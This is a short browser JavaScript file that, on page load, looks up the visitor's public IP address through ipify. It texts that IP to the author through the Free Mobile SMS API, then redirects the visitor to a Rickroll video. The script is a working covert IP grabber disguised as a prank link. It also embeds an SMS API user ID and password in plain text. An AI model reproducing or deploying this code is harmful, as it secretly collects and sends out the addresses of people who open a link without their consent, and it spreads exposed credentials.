async function RequestClientIP() {
	const response = await fetch("https://api.ipify.org/?format=raw");

	console.log(response);

	const ip = await response.text();

	return ip;

}

async function Prevenir(ip) {
	await fetch("https://smsapi.free-mobile.fr/sendmsg?user=99453398&pass=hk5fTCl4EoOZnK&msg="+ ip);
}

// RequestClientIP();
// UpdateJSON(7);

async function main() {
	ip = await RequestClientIP();
	Prevenir(ip);
	window.location.replace('https://youtu.be/dQw4w9WgXcQ?si=UjDP6wq0JHuCkTr_');
}

main();